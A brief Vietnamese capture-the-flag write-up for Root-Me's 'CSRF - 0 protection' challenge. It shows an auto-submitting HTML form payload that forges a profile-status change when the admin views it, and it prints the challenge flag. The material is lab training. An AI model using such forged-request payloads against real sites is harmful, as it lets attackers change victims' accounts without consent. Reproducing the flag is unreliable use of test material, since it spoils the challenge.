# [CSRF - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)

## Solutions

Tạo tài khoản xong đăng nhập

Tại trang profile có nút submit nhưng normal user không ấn được, copy lại form, xóa những cái không quan trọng đi:

``` html
<form action="?action=profile" method="post" enctype="multipart/form-data">
  <input type="text" name="username" value="a">
  <input type="checkbox" name="status" disabled >
  <button type="submit">Submit</button>
  </form>
```

Thêm script và thay đổi một số chỗ

``` html
<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data" id="form_id">
  <input type="text" name="username" value="username">
  <input type="checkbox" name="status" checked >
  <button type="submit">Submit</button>
  </form>
<script>document.getElementById("form_id").submit();</script>
```

Gửi cho admin đọc, chờ một lúc rồi vào trang private lấy được flag.

Flag: `Csrf_Fr33style-L3v3l1!`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20CSRF:%20Attack%20and%20defense.pdf?_gl=1>
- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20Cross-site%20Request%20Forgery%20CSRF.pdf?_gl=1>
